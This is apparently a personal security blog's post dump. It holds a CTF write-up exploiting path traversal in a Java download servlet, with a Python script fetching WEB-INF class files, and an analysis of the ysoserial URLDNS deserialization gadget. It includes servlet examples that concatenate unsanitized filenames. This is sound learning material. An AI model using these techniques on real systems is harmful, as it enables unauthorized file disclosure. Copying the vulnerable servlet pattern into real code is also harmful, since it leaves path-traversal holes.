[{"content":"Me Myself \u0026amp; I These days I have a desire to write something but I don\u0026rsquo;t know what I should write clearly.\nHope Someday I will know.\n//\\\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;//\\\n/\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;/\n/\u0026mdash;R O C K\u0026ndash;/\\\\\u0026mdash;\u0026mdash;\u0026ndash;|\n/\u0026mdash;B E A R\u0026ndash;/\n/\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;/\nEnjoy My Life Find More Interests. keep creative. :D\nFine, I don\u0026rsquo;t know how to make an intro all the time.\nAnyway I\u0026rsquo;d love to continue my interests in my life.\nBy the way I love My birds and Bear.\n:\u0026gt;\nWhich I Should Remember\n/\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-\\\nIf You Don\u0026rsquo;t Apply It Why You Learn It? \\\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-/\n","date":"2022-03-06T00:00:00Z","image":"https://66lueflam144.github.io/p/me/fish_hu13841065664374918025.jpg","permalink":"https://66lueflam144.github.io/p/me/","title":"Me Myself \u0026 I"},{"content":"easy java roar ctf\n1.intro 找了一圈感觉找不到源码。\n我现在在思考是不是我的错觉，但是这张图片又告诉我不是错觉是真的下载了一个文件\nxxx/Download?filename=help.docx\n说回来，最开始我想着是路径遍历的问题，虽然确实是，但是我想成了/etc 这类经典的。\n动用了../../../ 但是喜提notfound\n2.一个会触发java.io.FileNotFoundException的例子 How to Fix the FileNotFoundException in Java.io\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class FileNotFoundExceptionExample { public static void main(String args[]) { BufferedReader br = null; try { br = new BufferedReader(new FileReader(\u0026#34;myfile.txt\u0026#34;)); String data = null; while ((data = br.readLine()) != null) { System.out.println(data); } } catch (IOException ioe) { ioe.printStackTrace(); } finally { try { if (br != null) { br.close(); } } catch (IOException ioe) { ioe.printStackTrace(); } } } } 是否可以执行路径遍历 - 看起来可以\n3.tomcat web-inf i got a doc link\nApplication Developer\u0026rsquo;s Guide (9.0.97) - Deployment\n摘要一下：\n**.html, .jsp, etc. - The HTML and JSP pages, along with other files that must be visible to the client browser (such as JavaScript, stylesheet files, and images) for your application.\n/WEB-INF/web.xml - The Web Application Deployment Descriptor for your application. This is ::an XML file describing the servlets and other component::s that make up your application, along with any initialization parameters and container-managed security constraints that you want the server to enforce for you. This file is discussed in more detail in the following subsection.\n/WEB-INF/classes/ - This directory ::contains any Java class files (and associated resources) required for your application::, including both servlet and non-servlet classes, that are not combined into JAR files. If your classes are organized into Java packages, you must reflect this in the directory hierarchy under /WEB-INF/classes/. ::For example, a Java class named com.mycompany.mypackage.MyServlet would need to be stored in a file named /WEB-INF/classes/com/mycompany/mypackage/MyServlet.class.::\n/WEB-INF/lib/ - This directory ::contains JAR files that contain Java class files:: (and associated resources) required for your application, such as third party class libraries or JDBC drivers.\n3.1 一个例子 之前并没有仔细研究过这些，把重点全部放在了如何编写代码上。\n这个是一个使用local tomcat作为服务器的项目demo（其实是一个学习java web的时候写的我也不知道是个什么的东西）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 .idea src └── main ├── java │ └── com.test │ ├── Filters │ ├── Listeners │ │ └── ListenerforServletContext │ └── Servlets ├── resources └── webapp target ├── classes │ └── com │ └── test │ ├── Filters │ │ └── Filter1 │ ├── Listeners │ │ └── ListenerforServletContext │ └── Servlets │ └── DisplayHeader ├── generated-sources └── ServletDemo2 ├── META-INF ├── WEB-INF │ ├── classes │ │ └── com │ │ └── test │ │ ├── Filters │ │ │ └── Filter1 │ │ ├── Listeners │ │ │ └── ListenerforServletContext │ │ └── Servlets │ └── web.xml └── lib pom.xml 大概是这样，不过这个写得很不符合项目规范。\n3.2 为什么是.class文件 存放在target目录下的均为.class 文件，且1：1源文件。\n至于为什么是.class 文件\n.java 和.class 之间的关系简单说就是，::前者编译之后得到后者。::\n.java ：java源代码，面向人类 .class ：编译之后得到的字节码，面向JVM 要是更为深层，这和tomcat的实现有关。\n3.3 下载文件示例 大多数下载请求都是通过GET而不是POST\ndoGET\n对比一下实际靶场的error stack，应该还有一个doPost 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.example.download; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.io.OutputStream; @WebServlet(\u0026#34;/download\u0026#34;) public class FileDownloadServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { // 假设这里从请求参数中获取要下载的文件名，实际应用中可能有更复杂的获取方式 String filename = request.getParameter(\u0026#34;filename\u0026#34;); // 假设文件存放在服务器的某个特定目录下 String fileDirectory = \u0026#34;/path/to/files/\u0026#34;; File file = new File(fileDirectory + filename); if (file.exists()) { // 设置响应头，让浏览器知道这是一个文件下载操作，以及文件名等信息 response.setContentType(\u0026#34;application/octet-stream\u0026#34;); response.setHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\\\u0026#34;\u0026#34; + filename + \u0026#34;\\\u0026#34;\u0026#34;); // 获取文件输入流，用于读取文件内容 FileInputStream inputStream = new FileInputStream(file); // 获取输出流，用于将文件内容发送到客户端（浏览器） OutputStream outputStream = response.getOutputStream(); byte[] buffer = new byte[4096]; int bytesRead; while ((bytesRead = inputStream.read(buffer))!= -1) { outputStream.write(buffer, 0, bytesRead); } // 关闭流 inputStream.close(); outputStream.close(); } else { // 如果文件不存在，返回相应的错误信息给客户端 response.getWriter().write(\u0026#34;文件不存在：\u0026#34; + filename); } } } doPost\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 @WebServlet(\u0026#34;/download\u0026#34;) public class FileDownloadServlet extends HttpServlet { /...省略 @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException { // 同样从请求参数中获取要下载的文件名，实际可根据POST请求特点调整获取方式 String filename = request.getParameter(\u0026#34;filename\u0026#34;); // 假设文件存放在服务器的某个特定目录下，这里设置该目录路径，可根据实际情况修改 String fileDirectory = \u0026#34;/path/to/files/\u0026#34;; File file = new File(fileDirectory + filename); if (file.exists()) { // 设置响应头，让浏览器知道这是一个文件下载操作，以及文件名等信息 response.setContentType(\u0026#34;application/octet-stream\u0026#34;); response.setHeader(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\\\u0026#34;\u0026#34; + filename + \u0026#34;\\\u0026#34;\u0026#34;); // 获取文件输入流，用于读取文件内容 FileInputStream inputStream = new FileInputStream(file); // 获取输出流，用于将文件内容发送到客户端（浏览器） OutputStream outputStream = response.getOutputStream(); byte[] buffer = new byte[4096]; int bytesRead; while ((bytesRead = inputStream.read(buffer))!= -1) { outputStream.write(buffer, 0, bytesRead); } // 关闭流 inputStream.close(); outputStream.close(); } else { // 如果文件不存在，返回相应的错误信息给客户端 response.getWriter().write(\u0026#34;文件不存在：\u0026#34; + filename); } } } 4.Easy java writeup 4.1 请求分析 GET请求 - 为什么使用GET？与使用POST的区别？\n- 为什么GET请求无法下载反而显示notfound\n- 和靶场的doPost以及doGet实现有关\n是什么使得下载成功的？ - 使用了hackbar的POST\n4.2 请求切换 修改请求的文件是web.xml\n虽然502 error\n还有一句Apache Tomcat/8.5.24\n获取到的：\nusr/local\n调用链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 java.io.FileNotFoundException: ##47;usr##47;local##47;tomcat##47;webapps##47;ROOT##47;web.xml (No such file or directory) java.io.FileInputStream.open(Native Method) java.io.FileInputStream.open(FileInputStream.java:195) java.io.FileInputStream.\u0026lt;init\u0026gt;(FileInputStream.java:138) java.io.FileInputStream.\u0026lt;init\u0026gt;(FileInputStream.java:93) com.wm.ctf.DownloadController.doPost(DownloadController.java:24) javax.servlet.http.HttpServlet.service(HttpServlet.java:661) javax.servlet.http.HttpServlet.service(HttpServlet.java:742) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) 这算是什么级别的信息泄露？ - 错误处理不当？\n- 如果是，如何正确处理？\n- 或许是不要输出原生java的报错\n4.3 修改正确路径 相应的响应内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 HTTP/1.1 200 Server: openresty Date: Wed, 27 Nov 2024 02:15:12 GMT Content-Type: application/xml Connection: close Vary: Accept-Encoding Content-Disposition: attachment;filename=WEB-INF/web.xml Cache-Control: no-cache Content-Length: 1562 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;Index\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.IndexController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Index\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.LoginController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Login\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.DownloadController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Download\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.FlagController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Flag\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 一种常见的servlet和mapping的bind\n4.4 直接访问/Flag 抱着试一试的心\n此路不同就走另外的路。\n不过我没有想到的是走了获取字节码的路。\n1 2 3 4 5 6 7 8 9 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.FlagController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Flag\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 4.5 再次请求 请求得到结果\n看到Come On\n4.6 get flag 两个等号\nbase64编码都是以== 结尾吗？ 在 Base64 编码过程中，数据被按每 6 位一组进行分组，然后映射到对应的 Base64 字符表中的字符。\n当被编码的数据长度不是 3 的倍数时，会进行填充操作：\n1. 如果原数据长度除以 3 余 1，编码结果会在末尾添加 2 个 “=”。\n2. 如果原数据长度除以 3 余 2，编码结果会在末尾添加 1 个 “=”。\n3. 如果原数据长度是 3 的倍数，则不需要添加 “=”。\n一个非常有趣的ctf\n试图用python完成自动化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import requests import time import random def get_user_agent(): user_agents = [ \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/59.0\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.1709\u0026#34;, \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36\u0026#34;, ] return random.choice(user_agents) def get_headers(): headers = { \u0026#34;User-Agent\u0026#34;: get_user_agent(), \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.5\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;, } return headers def send_get_request(url, params=None): try: headers = get_headers() # 获取伪装的请求头 response = requests.get(url, headers=headers, params=params) if response.status_code == 200: print(\u0026#34;GET 请求成功!\u0026#34;) print(\u0026#34;响应内容：\u0026#34;, response.text[:5500]) else: print(f\u0026#34;GET 请求失败，状态码：{response.status_code}\u0026#34;) except requests.exceptions.RequestException as e: print(f\u0026#34;请求错误：{e}\u0026#34;) def send_post_request(url, data=None): try: headers = get_headers() response = requests.post(url, headers=headers, data=data) if response.status_code == 200: print(\u0026#34;POST 请求成功!\u0026#34;) print(\u0026#34;响应内容：\u0026#34;, response.text[:500]) else: print(f\u0026#34;POST 请求失败，状态码：{response.status_code}\u0026#34;) except requests.exceptions.RequestException as e: print(f\u0026#34;请求错误：{e}\u0026#34;) def main(): print(\u0026#34;--------It gets starting------\u0026#34;) url = \u0026#34;http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/\u0026#34; url = \u0026#34;http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/Download?filename=help.docx\u0026#34; # params = {\u0026#39;username\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;password\u0026#39;: 1} params = {} send_get_request(url, params) time.sleep(random.uniform(1, 5)) print(\u0026#34;-------wait ending--------\u0026#34;) data = {} send_post_request(url, data) if __name__ == \u0026#34;__main__\u0026#34;: main() 结果：\n1 2 3 4 5 6 7 8 9 10 --------It gets starting------ GET 请求成功! 响应内容： java.io.FileNotFoundException:{help.docx} POST 请求成功! 响应内容： PK\u0003\u0004\u0014 \u0006 ! ߤ�lZ\u0001 \u0005 \u0013\u0002[Content_Types].xml �\u0004\u0002(� \u0002 最后我也知道当时下载了help.docx不是幻觉了，是通过post下载了。\n现在的问题是，\n如何判断对方是java - java.io.FileNotFoundException:{help.docx}\n如何判断是tomcat - 通过POST得到help.docx之后，随便输一个文件，比如flag.docx，回显会有服务器版本，在上面的writeup部分\n- 另外一个就是，Java web主流的是spring，要么是maven，要么是tomcat。\n- maven复制src ，顶多是将resource 放到外面\n- tomcat的部分就和上面的tomcat部分 一样\n最终版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 import time import requests import random def get_user_agent(): user_agents = [ \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/59.0\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.1709\u0026#34;, \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36\u0026#34;, ] return random.choice(user_agents) def get_headers(): headers = { \u0026#34;User-Agent\u0026#34;: get_user_agent(), \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.5\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;, } return headers def send_post_request(url, data=None): try: headers = get_headers() response = requests.post(url, headers=headers, data=data) if response.status_code == 200: if \u0026#34;flag\u0026#34; in response.text.lower(): print(\u0026#34;Found flag!\u0026#34;) print(\u0026#34;Response content:\u0026#34;, response.text[:55000]) else: print(\u0026#34;POST request successful, but no flag found.\u0026#34;) else: print(f\u0026#34;POST request failed, status code: {response.status_code}\u0026#34;) except requests.exceptions.RequestException as e: print(f\u0026#34;Request error: {e}\u0026#34;) catalog = \u0026#34;WEB-INF/classes/com/wm/ctf/\u0026#34; classes = [\u0026#34;IndexController.class\u0026#34;, \u0026#34;LoginController.class\u0026#34;, \u0026#34;DownloadController.class\u0026#34;, \u0026#34;FlagController.class\u0026#34; ] url = f\u0026#34;http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/Download?filename={catalog}\u0026#34; def posts(): for clas in classes: print(f\u0026#34;Now is {clas}\u0026#34;) url_ = url + clas data = {} send_post_request(url_, data) time.sleep(random.uniform(10, 15)) if __name__ == \u0026#34;__main__\u0026#34;: posts() 就是最后要手动去base64解码一下\n","date":"2024-11-29T13:18:48+08:00","image":"https://66lueflam144.github.io/p/writeup-easy-java/python_hu12528317128531180383.png","permalink":"https://66lueflam144.github.io/p/writeup-easy-java/","title":"WriteUp easy java"},{"content":"Intro 比起之前的分析，更多的是在解答我自己的一些疑惑。\ncore code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 @PayloadTest(skip = \u0026#34;true\u0026#34;) @Dependencies() @Authors({ Authors.GEBL }) public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL(null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } Class SilentURLStreamHandler 是继承自URLStreamHandler的一个类 改写了openConnection和getHostAddress方法——防止在后续的URL 实例u初始化的阶段进行DNS Lookup。 继承类这一点也很关键，在后续的反序列化漏洞触发中，利用其继承自URLStreamHandler的性质，调用其hasjcode函数触发预期的dns lookup。 Method getObject public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt;这里需要注意 该方法是对Objectpayload\u0026lt;Object\u0026gt;所包含的getObject方法的具体实现。 进一步来说，ObjectPayload\u0026lt;T\u0026gt;其实是一个泛型接口，通过URLDNS这里的具体代码来实现一个适用于URLDNS的getObject方法。 另外需要理解的是，这是一个getObject方法，在这个项目中，在GeneratePayload.java中作为返回含有恶意代码的Object进行下一步序列化操作的方法。 在URLDNS中，该方法接收的输入是一个String，最终返回的是一个HashMap 截取片段：\n1 2 3 4 5 6 try { final ObjectPayload payload = payloadClass.newInstance(); final Object object = payload.getObject(command); PrintStream out = System.out; Serializer.serialize(object, out); ObjectPayload.Utils.releasePayload(payload, object); Steps 依照getObject方法中的顺序来进行步骤分析\n需要阅读很多源码才能懂这个有多么好玩\nhandler 在前面已经说过，这是一个为了避免出现初始化过程中的DNS Lookup的特殊handler\n至于为什么要防止初始化的时候出现DNS Lookup 因为用该攻击链条一般是用来向受控的DNS Server发送查询，检查是否存在反序列化漏洞的，在构造命令的时候，输入的String就是受控的Server的域名，如果初始化的时候就查询了，后续就可能会出现，直接使用本地DNS缓存而不是发出查询来进行连接的问题。 关于为什么后面又可以DNS Lookup 因为后面用的是URLStreamHandler.hashCode()来触发 初始化URL u的时候，使用的是构造函数，里面也会计算hashCode，不过在后面的setFiledValue中，被重置了，作为触发的入口。 说到这里感觉这个东西不是一个可以线性叙述的东西，我需要一个环形蛇。\nHashMap ht 这里只有一个需要关注的——为什么用HashMap 不过我没有找Map和HashMap来对比。\nanswer in a aspect： 从HashMap的反序列化来看，readObject方法中关于读取key和value的时候涉及的putVal——\u0026gt;hash——\u0026gt;key.hashCode是需要利用的 put方法可以将URL u和String url放进去， //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.这句话就简洁明了。 Reflections.setFieldValue 自定义的类，但主要就是将Field类的一些方法进行了封装，和java的反射进行了一些结合。\nReflections.setFieldValue(u, \u0026quot;hashCode\u0026quot;, -1);重置了URL u这个实例的hashcode的值为-1。 如果对这个FieldValue感到困惑，可以试试SerializationDumper\n通过SerializationDumper将序列化过的Person person = new Person(\u0026quot;Wonie\u0026quot;, 20);的数据流可视化，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 38 - 0x00 26 Value - com.example.dollar.drug.Example$Person - 0x636f6d2e6578616d706c652e646f6c6c61722e647275672e4578616d706c6524506572736f6e serialVersionUID - 0x00 00 00 00 00 00 00 01 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 2 - 0x00 02 Fields 0: Int - I - 0x49 fieldName Length - 3 - 0x00 03 Value - age - 0x616765 1: Object - L - 0x4c fieldName Length - 4 - 0x00 04 Value - name - 0x6e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata com.example.dollar.drug.Example$Person values age (int)20 - 0x00 00 00 14 name (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 5 - 0x00 05 Value - Wonie - 0x576f6e6965 另一个简单的理解，\n1 2 3 4 5 6 7 8 9 10 static class Person implements Serializable{ private static final long serialVersionUID = 1L; private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } } 这个里面的name和age都是Person类的FieldName，其值就是FieldValue。\n一个绝对会有的问题：为什么要设置成-1？\n在URL.hashCode()方法中\n1 2 3 4 5 6 7 8 public synchronized int hashCode() { if (this.hashCode != -1) { return this.hashCode; } else { this.hashCode = this.handler.hashCode(this); return this.hashCode; } } 当hashcode = -1的时候，触发handler.hashCode()，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 protected int hashCode(URL u) { int h = 0; String protocol = u.getProtocol(); if (protocol != null) { h += protocol.hashCode(); } InetAddress addr = this.getHostAddress(u); String file; if (addr != null) { h += addr.hashCode(); } else { file = u.getHost(); if (file != null) { h += file.toLowerCase().hashCode(); } } ....省略 到这里其实也就差不多结束了。\n总结 因为是反序列化的时候触发的，HasMap的readObject方法中有一个hash方法，该方法作为入口\n1 2 3 4 5 6 7 8 9 10 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ...省略 //重点在这里： for(int i = 0; i \u0026lt; mappings; ++i) { K key = s.readObject(); V value = s.readObject(); //HERE this.putVal(hash(key), key, value, false, false); ...省略 } 该hash又涉及到key.hashCode\n1 2 3 4 static final int hash(Object key) { int h; return key == null ? 0 : (h = key.hashCode()) ^ h \u0026gt;\u0026gt;\u0026gt; 16; }//如果是null返回0，不是就进行下一步 最后来到\n1 2 3 4 5 6 7 8 public synchronized int hashCode() { if (this.hashCode != -1) { return this.hashCode; } else { this.hashCode = this.handler.hashCode(this); return this.hashCode; } } 因为通过setFieldValue修改了hashCode = -1，所以就会进一步触发DNS lookup。\n番外 用这个做了点实验，\n结果如下\n不过在windows上却不成功。还没有检查是为什么。\nENDENDEND\n","date":"2024-11-17T14:41:28+08:00","permalink":"https://66lueflam144.github.io/p/post_urldns/","title":"Post_urldns"},{"content":"!\u0026ndash;more\u0026ndash;\u0026gt;\n什么是PDF 定义 wiki上关于PDF的百科\n参照Let\u0026rsquo;s write a PDF file对PDF文档的基本结构进行了解。\nPortable Document Format\n开放标准格式, 是为了在不同平台上显示统一格式的内容和布局而产生的\n基于文本的\n对非文本内容进行binary处理的\n结构 引用《面向恶意 PDF 文档分类的对抗样本生成方法研究》中的一个物理与逻辑结构的对照图：\n使用python现有的一个库来生成一个简单的PDF\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from reportlab.pdfgen import canvas from reportlab.lib.pagesizes import letter from pdfrw import PdfReader, PdfWriter # 创建一个简单的 PDF 文件 def create_pdf(file_path): c = canvas.Canvas(file_path, pagesize=letter) c.drawString(100, 750, \u0026#34;Hello, this is a PDF with JavaScript!\u0026#34;) c.save()) 用文本编辑器打开查看：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 %PDF-1.3 %file body 1 0 obj \u0026lt;\u0026lt;/Pages 2 0 R /Type /Catalog\u0026gt;\u0026gt; endobj 2 0 obj \u0026lt;\u0026lt;/Count 1 /Kids [3 0 R] /Type /Pages\u0026gt;\u0026gt; endobj 3 0 obj \u0026lt;\u0026lt;/Contents 4 0 R /MediaBox [0 0 612 792] /Parent 2 0 R /Resources \u0026lt;\u0026lt;/Font 5 0 R /ProcSet [/PDF /Text /ImageB /ImageC /ImageI]\u0026gt;\u0026gt; /Rotate 0 /Trans \u0026lt;\u0026lt;\u0026gt;\u0026gt; /Type /Page\u0026gt;\u0026gt; endobj 4 0 obj \u0026lt;\u0026lt;/Filter [/ASCII85Decode /FlateDecode] /Length 135\u0026gt;\u0026gt; stream GapQh0E=F,0U\\H3T\\pNYT^QKk?tc\u0026gt;IP,;W#U1^23ihPEM_?CW4KISi90MjG^2,FS#\u0026lt;RC5+c,n)Z;(0Q-/62bF7\u0026#34;kUW2hghHOphMt`3R\u0026gt;\u0026gt;jJ\u0026#39;kM\u0026amp;k,NKO=Z(s/W_[o\u0026gt;QCEF)jp~\u0026gt; endstream endobj 5 0 obj \u0026lt;\u0026lt;/F1 6 0 R\u0026gt;\u0026gt; endobj 6 0 obj \u0026lt;\u0026lt;/BaseFont /Helvetica /Encoding /WinAnsiEncoding /Name /F1 /Subtype /Type1 /Type /Font\u0026gt;\u0026gt; endobj xref 0 7 0000000000 65535 f 0000000015 00000 n 0000000062 00000 n 0000000117 00000 n 0000000301 00000 n 0000000523 00000 n 0000000552 00000 n trailer \u0026lt;\u0026lt;/Root 1 0 R /Size 7\u0026gt;\u0026gt; startxref 659 %%EOF 主要标签 %PDF - 1.x: 文件头。版本签名\n%file: 文件体开始标签。\nxref: 交叉引用表。列表引用标签，后面会跟着列表（table）\ntrailer: 文件尾。trailer标签和其内容\nstartxref: 指向xref列表的指针标签\n%%EOF1:结束符\n文件体，file body 一系列的间接对象\nobject的顺序并没有严格要求\n可以简单理解为，%和xref之间的所有内容都是file body。往回翻一下例子就可以理解了。\n里面的内容基本是dictionary object组成\n举一个例子\n1 2 3 4 5 6 1 0 obj 